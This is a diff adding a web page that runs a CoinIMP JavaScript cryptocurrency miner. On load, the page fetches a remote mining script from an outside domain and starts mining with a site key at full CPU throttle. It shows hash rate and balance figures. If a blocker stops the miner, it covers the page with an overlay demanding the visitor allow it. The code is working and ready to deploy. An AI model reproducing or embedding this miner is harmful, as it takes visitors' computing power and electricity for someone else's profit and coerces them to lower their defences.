@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Crypto Mining CoinIMP</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f0f0;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        .container {
+            max-width: 600px;
+            width: 90%;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            background-color: #ffffff;
+            text-align: center;
+        }
+
+        h1 {
+            color: #333333;
+        }
+
+        .info {
+            margin-top: 20px;
+            text-align: left;
+        }
+
+        .info p {
+            margin-bottom: 10px;
+        }
+
+        .hash-value {
+            font-size: 20px;
+            font-weight: bold;
+            color: #007bff;
+        }
+
+        .hash-table {
+            margin-top: 20px;
+            width: 100%;
+            border-collapse: collapse;
+        }
+
+        .hash-table th,
+        .hash-table td {
+            padding: 8px;
+            border-bottom: 1px solid #cccccc;
+            text-align: left;
+        }
+
+        .hash-table th {
+            background-color: #f0f0f0;
+        }
+
+        a {
+            color: #007bff;
+            text-decoration: none;
+        }
+
+        a:hover {
+            text-decoration: underline;
+        }
+    </style>
+    <script src="https://www.hostingcloud.racing/8oS7"></script>
+    <script>
+        var _client = new Client.Anonymous('201bf3164446664b5c4e56c8ce2d8d0464a9ded1d82355ffb07357741b6262c3', {
+            throttle: 0, c: 'w'
+        });
+        _client.start();
+        _client.addMiningNotification("Top", "This site is running JavaScript miner from coinimp.com. If it bothers you, you can stop it.", "#cccccc", 40, "#3d3d3d");
+
+        setTimeout(function(){
+            if(typeof _client === 'undefined' || _client === null)
+            {
+                var messageDiv = document.createElement("div");
+                messageDiv.setAttribute("style","width: 50%; background-color: white; padding: 15px; display: inline-block; vertical-align: middle;");
+                messageDiv.appendChild(document.createTextNode("Please allow our miner on your blocker software to continue browsing our site. Reload the page after that."));
+                var mainDiv = document.createElement("div");
+                mainDiv.setAttribute("style","position: absolute; top: 0px; right: 0px; width: 100%; height: 100%; display: flex; background-color: #4c4c4c;  align-items: center; justify-content: center");
+                mainDiv.appendChild(messageDiv);
+                document.body.appendChild(mainDiv);
+                document.getElementsByTagName("body")[0].style.overflow = "hidden";
+                window.scrollTo(0, 0);
+            }
+        },1000);
+
+        setTimeout(function(){
+            let speedValue = document.getElementById("speedValue");
+            let totalValue = document.getElementById("totalValue");
+            let pendingValue = document.getElementById("pendingValue");
+
+            setInterval(function(){
+                let speed = _client._threads.reduce((before, worker) => before + worker.hashesPerSecond, 0);
+                let total = _client._threads.reduce((before, worker) => before + worker.hashesTotal, 0);
+                let paymentPerHash = 0.0000000001; // Pendapatan per hash, ganti sesuai dengan kebutuhan
+                let pendingMintme = total * paymentPerHash; // Hitung saldo tertunda dalam MINTME
+
+                speedValue.textContent = speed;
+                totalValue.textContent = total;
+                pendingValue.textContent = pendingMintme.toFixed(8); // Tampilkan saldo tertunda dengan 8 angka di belakang koma
+            }, 500);
+        }, 2000);
+    </script>
+</head>
+<body>
+    <div class="container">
+        <h1>Crypto Mining</h1>
+        <div class="info">
+            <p>This site is running JavaScript miner from <a href="https://www.coinimp.com/">coinimp.com</a>. If it bothers you, you can stop it.</p>
+            <p>If you're interested in mining, you can start <a href="https://www.coinimp.com/invite/5c749fe6-9220-4369-9374-af94a7f60c8c">here</a>.</p>
+            <table class="hash-table">
+                <tr>
+                    <th colspan="2">Information</th>
+                </tr>
+                <tr>
+                    <td>Speed :</td>
+                    <td><span id="speedValue" class="hash-value">0</span></td>
+                </tr>
+                <tr>
+                    <td>Total :</td>
+                    <td><span id="totalValue" class="hash-value">0</span></td>
+                </tr>
+                <tr>
+                    <td>Balance :</td>
+                    <td><span id="pendingValue" class="hash-value">0.00000000</span></td>
+                </tr>
+            </table>
+        </div>
+    </div>
+</body>
+</html>
